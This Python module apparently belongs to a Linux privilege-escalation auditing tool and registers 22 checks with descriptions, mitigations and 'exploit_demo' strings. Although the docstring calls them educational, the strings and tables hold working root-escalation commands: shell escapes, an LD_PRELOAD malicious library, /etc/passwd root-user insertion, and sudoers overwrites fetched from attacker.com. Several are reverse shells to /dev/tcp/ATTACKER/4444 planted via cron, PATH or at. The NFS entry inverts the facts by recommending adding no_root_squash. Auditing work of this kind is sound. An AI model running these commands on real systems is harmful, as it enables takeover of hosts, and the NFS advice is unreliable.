"""
All 22 privilege escalation check functions registered as Technique objects.

Each check receives a CheckContext (plain data) and returns a list of evidence
strings.  An empty list means the technique is not applicable.  No actual
exploitation code is included — exploit_demo strings are educational only.
"""

from __future__ import annotations

from .techniques import Category, CheckContext, Severity, Technique

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_DANGEROUS_SUID = {
    "/bin/bash", "/usr/bin/bash",
    "/bin/sh", "/usr/bin/sh",
    "/usr/bin/find",
    "/usr/bin/vim", "/usr/bin/vi",
    "/usr/bin/python", "/usr/bin/python3",
    "/usr/bin/perl",
    "/usr/bin/ruby",
    "/usr/bin/awk", "/usr/bin/gawk",
    "/usr/bin/less", "/usr/bin/more",
    "/usr/bin/nmap",
    "/usr/bin/env",
    "/usr/bin/cp", "/usr/bin/mv",
    "/usr/bin/wget", "/usr/bin/curl",
    "/usr/bin/tee",
    "/usr/bin/node",
    "/usr/bin/pkexec",
    "/usr/lib/policykit-1/polkit-agent-helper-1",
}

_DANGEROUS_GROUPS = {
    "docker": "Mount host root via: docker run -v /:/host alpine chroot /host",
    "lxd": "Escalate via: lxc init ubuntu:18.04 privesc -c security.privileged=true",
    "disk": "Read raw disk: debugfs /dev/sda1 → read /etc/shadow",
    "adm": "Read system logs including auth secrets",
    "shadow": "Read /etc/shadow → crack password hashes",
    "sudo": "Run sudo su or sudo bash",
    "wheel": "Run sudo su or sudo bash",
    "staff": "Write to system directories without sudo",
    "video": "Capture framebuffer: cat /dev/fb0",
}

_DANGEROUS_CAPS = {
    "cap_setuid": "python3 -c \"import os; os.setuid(0); os.system('/bin/bash')\"",
    "cap_setgid": "Set GID to any group including shadow",
    "cap_net_admin": "Reconfigure network interfaces, sniff traffic",
    "cap_net_raw": "Create raw sockets, intercept packets",
    "cap_sys_admin": "Mount filesystems, modify kernel parameters",
    "cap_sys_ptrace": "Inject code into root processes via ptrace",
    "cap_dac_override": "Bypass file read/write permissions",
    "cap_dac_read_search": "Read any file regardless of permissions",
    "cap_chown": "Change file ownership including /etc/shadow",
    "cap_fowner": "Bypass permission checks (owner operations)",
    "cap_sys_module": "Load malicious kernel module",
    "cap_sys_chroot": "Escape chroot jail",
}

_SUDO_GTFO = {
    "find":   "sudo find / -exec /bin/bash \\;",
    "vim":    "sudo vim -c ':!/bin/bash'",
    "vi":     "sudo vi -c ':!/bin/bash'",
    "less":   "sudo less /etc/passwd  → !/bin/bash",
    "more":   "sudo more /etc/passwd  → !/bin/bash",
    "awk":    "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
    "nmap":   "sudo nmap --interactive → !sh",
    "perl":   "sudo perl -e 'exec \"/bin/bash\";'",
    "python": "sudo python -c 'import os; os.system(\"/bin/bash\")'",
    "python3":"sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
    "ruby":   "sudo ruby -e 'exec \"/bin/bash\"'",
    "env":    "sudo env /bin/bash",
    "tee":    "echo 'ALL ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers",
    "cp":     "sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash",
    "bash":   "sudo bash",
    "sh":     "sudo sh",
    "node":   "sudo node -e 'require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'",
    "tar":    "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
    "zip":    "sudo zip /tmp/nothing /etc/hosts -T --unzip-command 'sh -c /bin/bash'",
    "nano":   "sudo nano /etc/sudoers → add NOPASSWD:ALL",
    "cat":    "sudo cat /etc/shadow → crack hashes offline",
    "dd":     "sudo dd if=/etc/shadow → read shadow or dd overwrite",
    "wget":   "sudo wget http://attacker.com/sudoers -O /etc/sudoers",
    "curl":   "sudo curl http://attacker.com/sudoers -o /etc/sudoers",
    "chmod":  "sudo chmod +s /bin/bash",
    "chown":  "sudo chown root:root /tmp/evil && sudo chmod +s /tmp/evil",
    "pkexec": "CVE-2021-4034 PwnKit — sudo pkexec",
}


# ---------------------------------------------------------------------------
# Check functions
# ---------------------------------------------------------------------------

def _check_suid_dangerous(ctx: CheckContext) -> list[str]:
    return [p for p in ctx.suid_files if p in _DANGEROUS_SUID]


def _check_suid_custom(ctx: CheckContext) -> list[str]:
    """Non-standard SUID binaries (not in default system paths)."""
    standard_prefixes = ("/bin/", "/usr/bin/", "/sbin/", "/usr/sbin/",
                         "/usr/lib/", "/lib/")
    return [
        p for p in ctx.suid_files
        if p not in _DANGEROUS_SUID
        and not any(p.startswith(pfx) for pfx in standard_prefixes)
    ]


def _check_sudo_nopasswd(ctx: CheckContext) -> list[str]:
    evidence = []
    for cmd in ctx.sudo_nopasswd:
        if "ALL" in cmd or cmd.strip() == "":
            evidence.append(f"NOPASSWD: ALL — full root access")
        else:
            binary = cmd.strip().split("/")[-1].split()[0]
            if binary in _SUDO_GTFO:
                evidence.append(
                    f"NOPASSWD: {cmd.strip()} — GTFOBins exploit: {_SUDO_GTFO[binary]}"
                )
            else:
                evidence.append(f"NOPASSWD: {cmd.strip()} — review for abuse")
    return evidence


def _check_sudo_ld_preload(ctx: CheckContext) -> list[str]:
    if ctx.sudo_ld_preload:
        return ["LD_PRELOAD preserved in sudo env → compile evil .so → sudo LD_PRELOAD=/tmp/evil.so <cmd>"]
    return []


def _check_writable_cron(ctx: CheckContext) -> list[str]:
    evidence = []
    evidence.extend(f"Writable cron dir: {d}" for d in ctx.cron_dirs_writable)
    evidence.extend(f"Writable cron script: {f}" for f in ctx.cron_scripts_writable)
    return evidence


def _check_path_hijack(ctx: CheckContext) -> list[str]:
    return [f"Writable PATH dir: {d}" for d in ctx.writable_path_dirs]


def _check_world_writable_files(ctx: CheckContext) -> list[str]:
    sensitive = ["/etc/passwd", "/etc/sudoers", "/etc/crontab",
                 "/etc/environment", "/etc/profile", "/etc/bash.bashrc"]
    found = [f for f in ctx.world_writable_files if f in sensitive]
    return [f"World-writable sensitive file: {f}" for f in found]


def _check_passwd_writable(ctx: CheckContext) -> list[str]:
    if ctx.passwd_writable:
        return [
            "/etc/passwd is writable — append: hacker:$(openssl passwd -1 pass):0:0:root:/root:/bin/bash"
        ]
    return []


def _check_shadow_readable(ctx: CheckContext) -> list[str]:
    evidence = []
    if ctx.shadow_readable:
        evidence.append("/etc/shadow is readable — extract and crack hashes with hashcat/john")
    if ctx.shadow_writable:
        evidence.append("/etc/shadow is writable — replace root hash with known password")
    return evidence


def _check_capabilities(ctx: CheckContext) -> list[str]:
    evidence = []
    for path, caps_str in ctx.files_with_caps:
        caps_lower = caps_str.lower()
        for cap, demo in _DANGEROUS_CAPS.items():
            if cap in caps_lower:
                evidence.append(f"{path} has {cap} → {demo}")
    return evidence


def _check_dangerous_groups(ctx: CheckContext) -> list[str]:
    evidence = []
    groups_lower = {g.lower() for g in ctx.groups}
    for group, demo in _DANGEROUS_GROUPS.items():
        if group in groups_lower:
            evidence.append(f"Member of '{group}' group → {demo}")
    return evidence


def _check_docker_socket(ctx: CheckContext) -> list[str]:
    if ctx.docker_socket_readable:
        return [
            "/var/run/docker.sock is accessible — "
            "docker run -v /:/host --rm -it alpine chroot /host /bin/bash"
        ]
    return []


def _check_privileged_container(ctx: CheckContext) -> list[str]:
    if ctx.in_container and ctx.privileged_container:
        return [
            "Running inside a privileged container — "
            "mount host filesystem: mount /dev/sda1 /mnt && chroot /mnt"
        ]
    return []


def _check_nfs_no_root_squash(ctx: CheckContext) -> list[str]:
    return [
        f"NFS export without no_root_squash: {line}"
        for line in ctx.nfs_no_root_squash
    ]


def _check_sudo_all(ctx: CheckContext) -> list[str]:
    """User can run ALL commands as ALL users (with password)."""
    for entry in ctx.sudo_entries:
        if "ALL=(ALL" in entry and "NOPASSWD" not in entry:
            return [f"Unrestricted sudo (password required): {entry.strip()}"]
    return []


def _check_ld_preload_env(ctx: CheckContext) -> list[str]:
    """LD_PRELOAD set in environment for setuid programs."""
    if "LD_PRELOAD" in ctx.env_vars:
        return [
            f"LD_PRELOAD={ctx.env_vars['LD_PRELOAD']} set in environment — "
            "may inject into SUID programs"
        ]
    return []


def _check_writable_service_files(ctx: CheckContext) -> list[str]:
    """Systemd service files modifiable by current user."""
    return [f"Writable systemd service: {s}" for s in ctx.systemd_user_services
            if "writable" in s.lower()]


def _check_sudo_wildcard(ctx: CheckContext) -> list[str]:
    """Sudo commands containing * may allow argument injection."""
    evidence = []
    for cmd in ctx.sudo_nopasswd + ctx.sudo_entries:
        if "*" in cmd:
            evidence.append(
                f"Wildcard in sudo rule: {cmd.strip()} — "
                "tar wildcard: --checkpoint-action=exec=/bin/bash"
            )
    return evidence


def _check_world_writable_dirs(ctx: CheckContext) -> list[str]:
    """World-writable dirs in trusted script paths used by root."""
    risky = ["/usr/local/bin", "/usr/local/sbin", "/opt",
             "/srv", "/var/www", "/home"]
    return [
        f"World-writable directory in trusted path: {d}"
        for d in ctx.world_writable_dirs
        if d in risky
    ]


def _check_sgid_dangerous(ctx: CheckContext) -> list[str]:
    """SGID binaries that can be abused."""
    dangerous_sgid = {"/usr/bin/newgrp", "/usr/bin/wall", "/usr/bin/write",
                      "/usr/sbin/unix_chkpwd"}
    return [p for p in ctx.sgid_files if p in dangerous_sgid]


def _check_kernel_known_vuln(ctx: CheckContext) -> list[str]:
    """Flag old kernels likely affected by well-known LPE CVEs."""
    version = ctx.kernel_version
    if not version:
        return []
    evidence = []
    try:
        parts = version.split(".")
        major, minor = int(parts[0]), int(parts[1])
        patch = int(parts[2].split("-")[0]) if len(parts) > 2 else 0
    except (ValueError, IndexError):
        return [f"Could not parse kernel version: {version}"]

    # DirtyCow: < 4.8.3
    if (major, minor, patch) < (4, 8, 3):
        evidence.append(
            f"Kernel {version} — potential CVE-2016-5195 (DirtyCow): "
            "write to SUID/read-only mapped files"
        )
    # Polkit CVE-2021-4034: polkit < 0.119
    # Baron Samedit sudo CVE-2021-3156: sudo < 1.9.5p2
    # OverlayFS CVE-2021-3493: Ubuntu kernels < 5.11
    if major == 5 and minor < 11 and "ubuntu" in ctx.os_release.lower():
        evidence.append(
            f"Kernel {version} on Ubuntu — potential CVE-2021-3493 (OverlayFS LPE)"
        )
    return evidence


def _check_at_command(ctx: CheckContext) -> list[str]:
    """If 'at' is available and user can schedule, check for abuse."""
    for entry in ctx.sudo_nopasswd:
        if "/usr/bin/at" in entry or entry.strip().endswith("at"):
            return [
                "sudo NOPASSWD: /usr/bin/at — "
                "echo '/bin/bash -i >& /dev/tcp/attacker/4444 0>&1' | sudo at now"
            ]
    return []


def _check_env_path_hijack(ctx: CheckContext) -> list[str]:
    """PATH contains . (current dir) or a writable dir early in the list."""
    evidence = []
    for i, d in enumerate(ctx.path_dirs):
        if d in (".", ""):
            evidence.append(
                f"PATH[{i}]='.' — create malicious binary named after root-run command"
            )
    return evidence


# ---------------------------------------------------------------------------
# Technique registry
# ---------------------------------------------------------------------------

TECHNIQUES: list[Technique] = [
    Technique(
        technique_id="T01",
        name="Dangerous SUID Binary",
        category=Category.SUID_SGID,
        severity=Severity.CRITICAL,
        description=(
            "A binary owned by root has the SUID bit set and appears in GTFOBins. "
            "When executed, it runs as root regardless of who launches it."
        ),
        check=_check_suid_dangerous,
        exploit_demo="/bin/bash -p  # preserves EUID=0",
        mitigation="Remove SUID bit: chmod u-s <binary>. Audit with: find / -perm -u=s -type f 2>/dev/null",
        mitre_technique="T1548.001",
        references=["https://gtfobins.github.io/"],
    ),
    Technique(
        technique_id="T02",
        name="Custom SUID Binary",
        category=Category.SUID_SGID,
        severity=Severity.HIGH,
        description=(
            "A non-standard binary has the SUID bit set. Custom SUID binaries "
            "often contain logic flaws exploitable for privilege escalation."
        ),
        check=_check_suid_custom,
        exploit_demo="Run the binary and look for shell escape, buffer overflow, or command injection.",
        mitigation="Audit all SUID binaries periodically. Remove SUID unless absolutely necessary.",
        mitre_technique="T1548.001",
    ),
    Technique(
        technique_id="T03",
        name="Sudo NOPASSWD GTFOBin",
        category=Category.SUDO,
        severity=Severity.CRITICAL,
        description=(
            "Current user can run a GTFOBins-listed binary as root without a password."
        ),
        check=_check_sudo_nopasswd,
        exploit_demo="sudo find / -exec /bin/bash \\;",
        mitigation=(
            "Remove NOPASSWD entries. Restrict sudo to specific, non-exploitable commands. "
            "Use command arguments in sudoers rules."
        ),
        mitre_technique="T1548.003",
        references=["https://gtfobins.github.io/"],
    ),
    Technique(
        technique_id="T04",
        name="Sudo ALL — Unrestricted",
        category=Category.SUDO,
        severity=Severity.HIGH,
        description="User has unrestricted sudo access (ALL commands, may require password).",
        check=_check_sudo_all,
        exploit_demo="sudo su -  OR  sudo bash",
        mitigation="Restrict sudo to specific required commands only.",
        mitre_technique="T1548.003",
    ),
    Technique(
        technique_id="T05",
        name="Sudo LD_PRELOAD Preserved",
        category=Category.PATH,
        severity=Severity.CRITICAL,
        description=(
            "sudo preserves the LD_PRELOAD environment variable, allowing injection "
            "of a malicious shared library into root-owned processes."
        ),
        check=_check_sudo_ld_preload,
        exploit_demo=(
            "cat > /tmp/evil.c << 'EOF'\n"
            "#include <stdio.h>\n#include <unistd.h>\n"
            "void _init() { setuid(0); system(\"/bin/bash\"); }\n"
            "EOF\n"
            "gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c\n"
            "sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find"
        ),
        mitigation="Remove env_keep+=LD_PRELOAD from /etc/sudoers.",
        mitre_technique="T1574.006",
    ),
    Technique(
        technique_id="T06",
        name="Sudo Wildcard Injection",
        category=Category.SUDO,
        severity=Severity.HIGH,
        description=(
            "A sudo rule contains a wildcard (*) in its argument list, enabling "
            "flag injection into programs like tar, rsync, or find."
        ),
        check=_check_sudo_wildcard,
        exploit_demo=(
            "sudo tar -cf /dev/null /dev/null "
            "--checkpoint=1 --checkpoint-action=exec=/bin/bash"
        ),
        mitigation="Replace wildcards with explicit argument lists in sudoers rules.",
        mitre_technique="T1548.003",
    ),
    Technique(
        technique_id="T07",
        name="Writable Cron Job",
        category=Category.CRON,
        severity=Severity.HIGH,
        description=(
            "A cron script or cron directory writable by the current user is "
            "executed by root on a schedule."
        ),
        check=_check_writable_cron,
        exploit_demo=(
            "echo '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1' "
            "> /etc/cron.hourly/update.sh"
        ),
        mitigation=(
            "Set cron directories to 700 owned by root. "
            "Audit: ls -la /etc/cron.*/ /var/spool/cron/"
        ),
        mitre_technique="T1053.003",
    ),
    Technique(
        technique_id="T08",
        name="PATH Hijacking (Writable Directory)",
        category=Category.PATH,
        severity=Severity.HIGH,
        description=(
            "A directory early in $PATH is writable. If a root-owned script calls "
            "a command without an absolute path, a malicious binary shadows it."
        ),
        check=_check_path_hijack,
        exploit_demo=(
            "echo '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /usr/local/bin/python\n"
            "chmod +x /usr/local/bin/python  # waits for root script to call 'python'"
        ),
        mitigation="Use absolute paths in all scripts run by root. Restrict write permissions on PATH dirs.",
        mitre_technique="T1574.007",
    ),
    Technique(
        technique_id="T09",
        name="World-Writable Sensitive File",
        category=Category.WRITABLE,
        severity=Severity.CRITICAL,
        description="A sensitive system file (/etc/passwd, /etc/sudoers, etc.) is world-writable.",
        check=_check_world_writable_files,
        exploit_demo=(
            "# Add root user to /etc/passwd:\n"
            "echo 'hacked:$(openssl passwd -1 toor):0:0:root:/root:/bin/bash' >> /etc/passwd\n"
            "su hacked  # password: toor"
        ),
        mitigation="chmod 644 /etc/passwd && chmod 440 /etc/sudoers",
        mitre_technique="T1222.002",
    ),
    Technique(
        technique_id="T10",
        name="/etc/passwd Writable",
        category=Category.WRITABLE,
        severity=Severity.CRITICAL,
        description="/etc/passwd is writable, allowing direct insertion of a root-privileged user.",
        check=_check_passwd_writable,
        exploit_demo=(
            "openssl passwd -1 toor  # generate hash\n"
            "echo 'hacked:HASH:0:0::/root:/bin/bash' >> /etc/passwd\n"
            "su hacked"
        ),
        mitigation="chmod 644 /etc/passwd — owner root, group root.",
        mitre_technique="T1136.001",
    ),
    Technique(
        technique_id="T11",
        name="/etc/shadow Readable or Writable",
        category=Category.WRITABLE,
        severity=Severity.HIGH,
        description="/etc/shadow is accessible, exposing password hashes for offline cracking.",
        check=_check_shadow_readable,
        exploit_demo=(
            "cat /etc/shadow | grep root  # readable\n"
            "hashcat -a 0 -m 1800 root_hash.txt rockyou.txt  # crack offline"
        ),
        mitigation="chmod 640 /etc/shadow — owner root, group shadow.",
        mitre_technique="T1003.008",
    ),
    Technique(
        technique_id="T12",
        name="Linux Capability Abuse",
        category=Category.CAPABILITIES,
        severity=Severity.HIGH,
        description=(
            "A binary has elevated Linux capabilities (cap_setuid, cap_sys_admin, etc.) "
            "that can be leveraged for privilege escalation without SUID."
        ),
        check=_check_capabilities,
        exploit_demo=(
            "# cap_setuid on python3:\n"
            "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
        ),
        mitigation=(
            "Audit: getcap -r / 2>/dev/null\n"
            "Remove unnecessary capabilities: setcap -r <binary>"
        ),
        mitre_technique="T1548.001",
        references=["https://man7.org/linux/man-pages/man7/capabilities.7.html"],
    ),
    Technique(
        technique_id="T13",
        name="Dangerous Group Membership",
        category=Category.GROUP,
        severity=Severity.CRITICAL,
        description=(
            "Current user belongs to a high-privilege group (docker, lxd, disk, shadow) "
            "that provides an indirect path to root."
        ),
        check=_check_dangerous_groups,
        exploit_demo=(
            "# docker group:\n"
            "docker run -v /:/host --rm -it alpine chroot /host /bin/bash"
        ),
        mitigation=(
            "Remove users from docker/lxd/disk groups unless strictly necessary. "
            "Use rootless Docker where possible."
        ),
        mitre_technique="T1078.003",
    ),
    Technique(
        technique_id="T14",
        name="Docker Socket Accessible",
        category=Category.CONTAINER,
        severity=Severity.CRITICAL,
        description=(
            "/var/run/docker.sock is readable by the current user, giving "
            "full control over Docker — equivalent to root access."
        ),
        check=_check_docker_socket,
        exploit_demo=(
            "docker run -v /:/host --rm -it alpine chroot /host /bin/bash\n"
            "# OR via API:\n"
            "curl --unix-socket /var/run/docker.sock http://localhost/containers/json"
        ),
        mitigation=(
            "Restrict docker.sock to root or docker group. "
            "Use Docker API authorization plugins."
        ),
        mitre_technique="T1552.007",
    ),
    Technique(
        technique_id="T15",
        name="Privileged Container Escape",
        category=Category.CONTAINER,
        severity=Severity.CRITICAL,
        description=(
            "Running inside a --privileged Docker container, which grants all "
            "Linux capabilities and access to the host's device filesystem."
        ),
        check=_check_privileged_container,
        exploit_demo=(
            "fdisk -l  # find host disk\n"
            "mkdir /mnt/host && mount /dev/sda1 /mnt/host\n"
            "chroot /mnt/host /bin/bash"
        ),
        mitigation="Never run containers with --privileged. Use specific required capabilities only.",
        mitre_technique="T1611",
    ),
    Technique(
        technique_id="T16",
        name="NFS no_root_squash",
        category=Category.NFS,
        severity=Severity.HIGH,
        description=(
            "An NFS export is configured without no_root_squash, meaning the remote "
            "root user is treated as root on the NFS server."
        ),
        check=_check_nfs_no_root_squash,
        exploit_demo=(
            "# On attacker machine (root):\n"
            "mount TARGET:/shared /mnt/nfs\n"
            "cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash\n"
            "# On target (low-priv user):\n"
            "/shared/bash -p  # EUID=0"
        ),
        mitigation="Add no_root_squash to /etc/exports and restart nfs-kernel-server.",
        mitre_technique="T1210",
    ),
    Technique(
        technique_id="T17",
        name="Kernel LPE (Known CVE)",
        category=Category.KERNEL,
        severity=Severity.CRITICAL,
        description="Running kernel version matches signatures of known local privilege escalation CVEs.",
        check=_check_kernel_known_vuln,
        exploit_demo=(
            "# DirtyCow (CVE-2016-5195):\n"
            "gcc -pthread dirty.c -o dirty -lcrypt && ./dirty"
        ),
        mitigation=(
            "Apply kernel updates: apt upgrade / yum update. "
            "Use kernel live-patching (kpatch, livepatch) for critical systems."
        ),
        mitre_technique="T1068",
        references=["https://dirtycow.ninja/"],
    ),
    Technique(
        technique_id="T18",
        name="SGID Dangerous Binary",
        category=Category.SUID_SGID,
        severity=Severity.MEDIUM,
        description="A binary has the SGID bit set for a privileged group, enabling group escalation.",
        check=_check_sgid_dangerous,
        exploit_demo="newgrp shadow  # gain shadow group access if SGID set",
        mitigation="Audit SGID binaries: find / -perm -g=s -type f 2>/dev/null",
        mitre_technique="T1548.001",
    ),
    Technique(
        technique_id="T19",
        name="LD_PRELOAD in Environment",
        category=Category.PATH,
        severity=Severity.MEDIUM,
        description=(
            "LD_PRELOAD is set in the current environment. "
            "It will be inherited by child processes and may affect SUID binaries if not cleared."
        ),
        check=_check_ld_preload_env,
        exploit_demo="LD_PRELOAD=/tmp/evil.so some_suid_binary",
        mitigation=(
            "SUID/SGID programs should clear LD_PRELOAD (modern linker does this automatically). "
            "Verify glibc is up to date."
        ),
        mitre_technique="T1574.006",
    ),
    Technique(
        technique_id="T20",
        name="World-Writable Trusted Directory",
        category=Category.WRITABLE,
        severity=Severity.HIGH,
        description=(
            "A directory in a trusted system path (/usr/local/bin, /opt, etc.) "
            "is world-writable, enabling binary planting."
        ),
        check=_check_world_writable_dirs,
        exploit_demo=(
            "echo '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /usr/local/bin/update\n"
            "chmod +x /usr/local/bin/update"
        ),
        mitigation="chmod 755 /usr/local/bin. Audit with: find / -maxdepth 5 -writable -type d 2>/dev/null",
        mitre_technique="T1574.009",
    ),
    Technique(
        technique_id="T21",
        name="PATH Contains '.' (Dot in PATH)",
        category=Category.PATH,
        severity=Severity.MEDIUM,
        description=(
            "The current directory (.) is in $PATH. If a root script is run from a "
            "user-controlled directory, a local binary shadows the intended command."
        ),
        check=_check_env_path_hijack,
        exploit_demo=(
            "# In attacker-writable directory:\n"
            "echo '#!/bin/bash\\nchmod +s /bin/bash' > ls && chmod +x ls\n"
            "# Wait for root to run 'ls' in this directory"
        ),
        mitigation="Never include '.' in $PATH, especially in root's environment.",
        mitre_technique="T1574.007",
    ),
    Technique(
        technique_id="T22",
        name="Writable Systemd User Service",
        category=Category.SERVICE,
        severity=Severity.HIGH,
        description=(
            "A systemd service unit file is writable by the current user and "
            "runs under a privileged account."
        ),
        check=_check_writable_service_files,
        exploit_demo=(
            "# Edit service ExecStart:\n"
            "echo '[Service]\\nExecStart=/bin/bash -c \"chmod +s /bin/bash\"' "
            "> /etc/systemd/system/target.service\n"
            "systemctl daemon-reload && systemctl restart target"
        ),
        mitigation="chmod 644 service files, owned by root. Audit writable units.",
        mitre_technique="T1543.002",
    ),
]
